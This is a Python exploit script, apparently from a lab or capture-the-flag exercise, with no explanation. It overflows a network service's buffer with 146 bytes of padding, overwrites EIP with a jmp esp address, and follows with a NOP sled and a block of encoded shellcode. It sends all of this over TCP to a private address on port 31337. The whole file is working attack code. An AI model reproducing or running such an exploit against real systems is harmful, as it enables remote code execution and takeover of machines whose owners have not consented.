import socket
server = "192.168.178.52"
port = 31337
# offset = 146
overflow = "A" * 146
# jmp esp 080414C3
eip = '\xC3\x14\x04\x08'
nop = '\x90' * 16
	
shellcode =  b""
shellcode += b"\xd9\xc3\xd9\x74\x24\xf4\xb8\x09\x69\xb8\x0b"
shellcode += b"\x5b\x33\xc9\xb1\x52\x31\x43\x17\x03\x43\x17"
shellcode += b"\x83\xe2\x95\x5a\xfe\x08\x8d\x19\x01\xf0\x4e"
shellcode += b"\x7e\x8b\x15\x7f\xbe\xef\x5e\xd0\x0e\x7b\x32"
shellcode += b"\xdd\xe5\x29\xa6\x56\x8b\xe5\xc9\xdf\x26\xd0"
shellcode += b"\xe4\xe0\x1b\x20\x67\x63\x66\x75\x47\x5a\xa9"
shellcode += b"\x88\x86\x9b\xd4\x61\xda\x74\x92\xd4\xca\xf1"
shellcode += b"\xee\xe4\x61\x49\xfe\x6c\x96\x1a\x01\x5c\x09"
shellcode += b"\x10\x58\x7e\xa8\xf5\xd0\x37\xb2\x1a\xdc\x8e"
shellcode += b"\x49\xe8\xaa\x10\x9b\x20\x52\xbe\xe2\x8c\xa1"
shellcode += b"\xbe\x23\x2a\x5a\xb5\x5d\x48\xe7\xce\x9a\x32"
shellcode += b"\x33\x5a\x38\x94\xb0\xfc\xe4\x24\x14\x9a\x6f"
shellcode += b"\x2a\xd1\xe8\x37\x2f\xe4\x3d\x4c\x4b\x6d\xc0"
shellcode += b"\x82\xdd\x35\xe7\x06\x85\xee\x86\x1f\x63\x40"
shellcode += b"\xb6\x7f\xcc\x3d\x12\xf4\xe1\x2a\x2f\x57\x6e"
shellcode += b"\x9e\x02\x67\x6e\x88\x15\x14\x5c\x17\x8e\xb2"
shellcode += b"\xec\xd0\x08\x45\x12\xcb\xed\xd9\xed\xf4\x0d"
shellcode += b"\xf0\x29\xa0\x5d\x6a\x9b\xc9\x35\x6a\x24\x1c"
shellcode += b"\x99\x3a\x8a\xcf\x5a\xea\x6a\xa0\x32\xe0\x64"
shellcode += b"\x9f\x23\x0b\xaf\x88\xce\xf6\x38\x77\xa6\x4a"
shellcode += b"\xa1\x1f\xb5\xaa\xc9\xe6\x30\x4c\x87\x08\x15"
shellcode += b"\xc7\x30\xb0\x3c\x93\xa1\x3d\xeb\xde\xe2\xb6"
shellcode += b"\x18\x1f\xac\x3e\x54\x33\x59\xcf\x23\x69\xcc"
shellcode += b"\xd0\x99\x05\x92\x43\x46\xd5\xdd\x7f\xd1\x82"
shellcode += b"\x8a\x4e\x28\x46\x27\xe8\x82\x74\xba\x6c\xec"
shellcode += b"\x3c\x61\x4d\xf3\xbd\xe4\xe9\xd7\xad\x30\xf1"
shellcode += b"\x53\x99\xec\xa4\x0d\x77\x4b\x1f\xfc\x21\x05"
shellcode += b"\xcc\x56\xa5\xd0\x3e\x69\xb3\xdc\x6a\x1f\x5b"
shellcode += b"\x6c\xc3\x66\x64\x41\x83\x6e\x1d\xbf\x33\x90"
shellcode += b"\xf4\x7b\x43\xdb\x54\x2d\xcc\x82\x0d\x6f\x91"
shellcode += b"\x34\xf8\xac\xac\xb6\x08\x4d\x4b\xa6\x79\x48"
shellcode += b"\x17\x60\x92\x20\x08\x05\x94\x97\x29\x0c"


# badchars = \x00\x0a
exploit = overflow + eip + nop + shellcode + "\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, port))
s.send((exploit))
s.close()
